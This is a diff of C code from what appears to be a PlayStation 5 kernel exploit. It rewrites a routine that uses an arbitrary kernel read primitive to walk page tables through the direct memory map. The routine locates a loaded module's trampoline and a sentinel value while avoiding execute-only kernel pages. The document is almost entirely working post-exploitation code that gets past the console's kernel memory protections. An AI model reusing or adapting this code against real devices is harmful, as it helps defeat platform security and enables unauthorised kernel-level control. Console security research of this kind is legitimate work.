@@ -1383,48 +1383,46 @@ static void campaign_kmod_kldload(void) {
                (unsigned long)g_kdata_base, (unsigned long)g_ktext_base,
                (unsigned long)g_dmap_base);
 
-        /* ── XOM-safe scan strategy ──
+        /* ── XOM-safe FAST hierarchical scan ──
          *
-         * CRITICAL: We cannot use kernel_copyout on arbitrary kernel VAs
-         * because PS5 kernel .text is execute-only (XOM) via NPT.  Reading
-         * XOM pages through the pipe-based kernel_copyout triggers a nested
-         * page fault → hypervisor panic → kernel panic.
+         * We CANNOT kernel_copyout arbitrary kernel VAs (XOM pages cause
+         * NPT fault → kernel panic).  Instead we walk the page tables
+         * via DMAP and read page content via DMAP.
          *
-         * Safe approach: for each candidate VA, walk the kernel page tables
-         * (via DMAP, which is always readable) to get the physical address,
-         * then read the physical page through DMAP.  DMAP maps ALL physical
-         * memory as RW, so even XOM .text pages are readable via their DMAP
-         * mapping.
+         * For speed we walk the 4-level page tables hierarchically:
+         *   - Skip unmapped 512GB regions (PML4 not present)
+         *   - Skip unmapped 1GB regions   (PDPT not present)
+         *   - Skip unmapped 2MB regions   (PD not present)
+         *   - For mapped 2MB: bulk-read the PT page (512 entries, 4KB)
+         *     in ONE kernel_copyout, then iterate locally
          *
-         * Scan ranges (with overflow protection for high kernel addresses):
-         *   Range 1: g_kdata_base + 128MB → top of address space
-         *   Range 2: DMAP + 8GB → g_ktext_base
-         *   Range 3: start of kernel VA → DMAP base
+         * This turns ~1M kernel_copyouts into ~500 for a mostly-unmapped
+         * 1GB range.
          */
 
         uint64_t trampoline_kva = 0;
-        uint64_t total_pages_scanned = 0, total_pages_mapped = 0;
+        uint64_t total_2mb_checked = 0, total_2mb_mapped = 0;
+        uint64_t total_pages_mapped = 0;
         uint8_t hdr[64];
 
-        /* Define scan ranges (up to 4) */
+        /* Scan ranges */
         struct { uint64_t start, end; const char *label; } ranges[4];
         int nranges = 0;
 
-        /* Range 1: above kernel data → top of address space */
+        /* Range 1: above kernel data */
         {
             uint64_t s = g_kdata_base + 0x8000000;
-            uint64_t e = 0xFFFFFFFFFFFFF000ULL;
-            if (e - s > 0x40000000ULL) e = s + 0x40000000ULL;
+            uint64_t e = s + 0x40000000ULL; /* +1GB cap */
             if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "above kdata"}; }
         }
-        /* Range 2: between DMAP end and kernel text */
+        /* Range 2: DMAP end → kernel text */
         {
             uint64_t s = g_dmap_base + 0x200000000ULL;
             uint64_t e = g_ktext_base;
             if (e > s && e - s > 0x40000000ULL) s = e - 0x40000000ULL;
             if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "DMAP→ktext gap"}; }
         }
-        /* Range 3: below DMAP base */
+        /* Range 3: below DMAP */
         {
             uint64_t s = 0xFFFF800000000000ULL;
             uint64_t e = g_dmap_base;
@@ -1439,89 +1437,203 @@ static void campaign_kmod_kldload(void) {
                    (unsigned long)rs, (unsigned long)re,
                    (unsigned long)((re - rs) >> 20));
 
-            for (uint64_t va = rs; va < re && va >= rs; va += 0x1000) {
-                total_pages_scanned++;
-                if (total_pages_scanned % 16384 == 0)
-                    printf("    ...%luMB, %lu mapped so far\n",
-                           (unsigned long)(total_pages_scanned >> 8),
-                           (unsigned long)total_pages_mapped);
+            /* Walk page tables hierarchically, 2MB at a time */
+            uint64_t va = rs & ~0x1FFFFFULL; /* align down to 2MB */
 
-                /* Walk page tables to get PA (safe: reads via DMAP) */
-                uint64_t pa = va_to_pa_quiet(va);
-                if (pa == 0) continue;  /* not mapped */
-                total_pages_mapped++;
-
-                /* Read via DMAP — safe even for XOM pages */
-                if (kernel_copyout(g_dmap_base + (pa & ~0xFFFULL), hdr, sizeof(hdr)) != 0)
+            for (; va < re && trampoline_kva == 0; ) {
+                /* --- PML4 (512GB granularity) --- */
+                uint64_t pml4e;
+                kernel_copyout(g_dmap_base + g_cr3_phys +
+                               ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
+                if (!(pml4e & PTE_PRESENT)) {
+                    uint64_t next = (va + (1ULL << 39)) & ~((1ULL << 39) - 1);
+                    if (next <= va) break; /* overflow */
+                    va = next;
                     continue;
+                }
 
-                if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) != 0)
+                /* --- PDPT (1GB granularity) --- */
+                uint64_t pdpte;
+                kernel_copyout(g_dmap_base + (pml4e & PTE_PA_MASK) +
+                               ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
+                if (!(pdpte & PTE_PRESENT)) {
+                    uint64_t next = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
+                    if (next <= va) break;
+                    va = next;
                     continue;
-                if (memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) != 0)
+                }
+                if (pdpte & PTE_PS) {
+                    /* 1GB huge page (typically DMAP itself) — skip */
+                    uint64_t next = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
+                    if (next <= va) break;
+                    va = next;
                     continue;
+                }
 
-                trampoline_kva = va;
-                printf("[+] FOUND trampoline at VA 0x%lx (PA 0x%lx)!\n",
-                       (unsigned long)va, (unsigned long)pa);
-                printf("    bytes: ");
-                for (int b = 0; b < 35; b++) printf("%02x ", hdr[b]);
-                printf("\n");
-                break;
+                /* --- PD (2MB granularity) --- */
+                uint64_t pde;
+                kernel_copyout(g_dmap_base + (pdpte & PTE_PA_MASK) +
+                               ((va >> 21) & 0x1FF) * 8, &pde, 8);
+                total_2mb_checked++;
+
+                if (!(pde & PTE_PRESENT)) {
+                    va += (1ULL << 21);
+                    continue;
+                }
+
+                if (pde & PTE_PS) {
+                    /* 2MB huge page — scan each 4KB offset */
+                    total_2mb_mapped++;
+                    uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
+                    uint64_t chunk_start = va & ~0x1FFFFFULL;
+                    for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
+                        uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
+                        if (page_va < rs || page_va >= re) continue;
+                        total_pages_mapped++;
+                        uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
+                        if (kernel_copyout(g_dmap_base + pa, hdr, sizeof(hdr)) != 0)
+                            continue;
+                        if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                            memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                            trampoline_kva = page_va;
+                        }
+                    }
+                    va += (1ULL << 21);
+                    continue;
+                }
+
+                /* --- PT: bulk-read 512 entries (4KB) in ONE kernel_copyout --- */
+                total_2mb_mapped++;
+                uint64_t pt_entries[512];
+                kernel_copyout(g_dmap_base + (pde & PTE_PA_MASK),
+                               pt_entries, sizeof(pt_entries));
+
+                uint64_t chunk_start = va & ~0x1FFFFFULL;
+                for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
+                    uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
+                    if (page_va < rs || page_va >= re) continue;
+                    if (!(pt_entries[pi] & PTE_PRESENT)) continue;
+                    total_pages_mapped++;
+
+                    uint64_t pa = pt_entries[pi] & PTE_PA_MASK;
+                    if (kernel_copyout(g_dmap_base + pa, hdr, sizeof(hdr)) != 0)
+                        continue;
+                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                        trampoline_kva = page_va;
+                    }
+                }
+                va += (1ULL << 21);
             }
+
+            printf("    2MB chunks: %lu checked, %lu mapped; pages: %lu mapped\n",
+                   (unsigned long)total_2mb_checked,
+                   (unsigned long)total_2mb_mapped,
+                   (unsigned long)total_pages_mapped);
         }
 
-        /* Fallback: scan for sentinel value (also via DMAP) */
+        if (trampoline_kva) {
+            printf("[+] FOUND trampoline at VA 0x%lx!\n",
+                   (unsigned long)trampoline_kva);
+            printf("    bytes: ");
+            for (int b = 0; b < 35; b++) printf("%02x ", hdr[b]);
+            printf("\n");
+        }
+
+        /* Fallback: sentinel scan (also hierarchical + DMAP) */
         if (trampoline_kva == 0) {
-            printf("[*] Page-boundary scan failed — trying sentinel scan via DMAP...\n");
+            printf("[*] Trampoline not at page start — trying sentinel scan...\n");
             printf("[*] Searching for sentinel 0x%lx\n", (unsigned long)result_kva);
 
             uint8_t page[4096];
             uint64_t sentinel_va = 0;
+
             for (int ri = 0; ri < nranges && sentinel_va == 0; ri++) {
-                for (uint64_t va = ranges[ri].start;
-                     va < ranges[ri].end && va >= ranges[ri].start;
-                     va += 0x1000) {
-                    uint64_t pa = va_to_pa_quiet(va);
-                    if (pa == 0) continue;
-                    if (kernel_copyout(g_dmap_base + (pa & ~0xFFFULL),
-                                       page, sizeof(page)) != 0)
-                        continue;
-                    for (int off = 0; off <= 4096 - 8; off += 8) {
-                        uint64_t v;
-                        memcpy(&v, page + off, 8);
-                        if (v == result_kva) {
-                            sentinel_va = va + off;
-                            printf("[+] Found sentinel at VA 0x%lx\n",
-                                   (unsigned long)sentinel_va);
-                            break;
+                uint64_t rs = ranges[ri].start, re = ranges[ri].end;
+                uint64_t va = rs & ~0x1FFFFFULL;
+
+                for (; va < re && sentinel_va == 0; ) {
+                    uint64_t pml4e;
+                    kernel_copyout(g_dmap_base + g_cr3_phys +
+                                   ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
+                    if (!(pml4e & PTE_PRESENT)) {
+                        uint64_t n = (va + (1ULL<<39)) & ~((1ULL<<39)-1);
+                        if (n <= va) break; va = n; continue;
+                    }
+                    uint64_t pdpte;
+                    kernel_copyout(g_dmap_base + (pml4e & PTE_PA_MASK) +
+                                   ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
+                    if (!(pdpte & PTE_PRESENT) || (pdpte & PTE_PS)) {
+                        uint64_t n = (va + (1ULL<<30)) & ~((1ULL<<30)-1);
+                        if (n <= va) break; va = n; continue;
+                    }
+                    uint64_t pde;
+                    kernel_copyout(g_dmap_base + (pdpte & PTE_PA_MASK) +
+                                   ((va >> 21) & 0x1FF) * 8, &pde, 8);
+                    if (!(pde & PTE_PRESENT)) { va += (1ULL<<21); continue; }
+
+                    if (pde & PTE_PS) {
+                        uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
+                        uint64_t cs = va & ~0x1FFFFFULL;
+                        for (int pi = 0; pi < 512 && !sentinel_va; pi++) {
+                            uint64_t pva = cs + (uint64_t)pi * 0x1000;
+                            if (pva < rs || pva >= re) continue;
+                            uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
+                            if (kernel_copyout(g_dmap_base + pa, page, 4096) != 0) continue;
+                            for (int off = 0; off <= 4096 - 8; off += 8) {
+                                uint64_t v; memcpy(&v, page + off, 8);
+                                if (v == result_kva) {
+                                    sentinel_va = pva + off;
+                                    printf("[+] Found sentinel at 0x%lx\n", (unsigned long)sentinel_va);
+                                }
+                            }
+                        }
+                        va += (1ULL<<21); continue;
+                    }
+
+                    uint64_t pt[512];
+                    kernel_copyout(g_dmap_base + (pde & PTE_PA_MASK), pt, sizeof(pt));
+                    uint64_t cs = va & ~0x1FFFFFULL;
+                    for (int pi = 0; pi < 512 && !sentinel_va; pi++) {
+                        uint64_t pva = cs + (uint64_t)pi * 0x1000;
+                        if (pva < rs || pva >= re) continue;
+                        if (!(pt[pi] & PTE_PRESENT)) continue;
+                        uint64_t pa = pt[pi] & PTE_PA_MASK;
+                        if (kernel_copyout(g_dmap_base + pa, page, 4096) != 0) continue;
+                        for (int off = 0; off <= 4096 - 8; off += 8) {
+                            uint64_t v; memcpy(&v, page + off, 8);
+                            if (v == result_kva) {
+                                sentinel_va = pva + off;
+                                printf("[+] Found sentinel at 0x%lx\n", (unsigned long)sentinel_va);
+                            }
                         }
                     }
+                    va += (1ULL<<21);
                 }
             }
 
             if (sentinel_va) {
-                /* .text is before .data in the loaded module.
-                 * Search backward from sentinel for trampoline. */
+                /* Search backward from sentinel for trampoline */
                 uint64_t slo = (sentinel_va & ~0xFFFULL) - 0x10000;
-                for (uint64_t va = slo; va < sentinel_va; va += 0x1000) {
-                    uint64_t pa = va_to_pa_quiet(va);
+                for (uint64_t a = slo; a < sentinel_va; a += 0x1000) {
+                    uint64_t pa = va_to_pa_quiet(a);
                     if (pa == 0) continue;
                     if (kernel_copyout(g_dmap_base + (pa & ~0xFFFULL),
-                                       hdr, sizeof(hdr)) != 0)
-                        continue;
+                                       hdr, sizeof(hdr)) != 0) continue;
                     if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                         memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
-                        trampoline_kva = va;
-                        printf("[+] FOUND trampoline at 0x%lx (backward from sentinel)!\n",
-                               (unsigned long)va);
+                        trampoline_kva = a;
+                        printf("[+] FOUND trampoline at 0x%lx (near sentinel)!\n",
+                               (unsigned long)a);
                         break;
                     }
                 }
             }
         }
 
-        printf("[*] Scan complete: %lu pages checked, %lu mapped\n",
-               (unsigned long)total_pages_scanned, (unsigned long)total_pages_mapped);
+        printf("[*] Scan done: %lu 2MB chunks (%lu mapped), %lu pages mapped\n",
+               (unsigned long)total_2mb_checked, (unsigned long)total_2mb_mapped,
+               (unsigned long)total_pages_mapped);
 
         if (trampoline_kva == 0) {
             printf("[-] Trampoline not found in any scan range.\n");
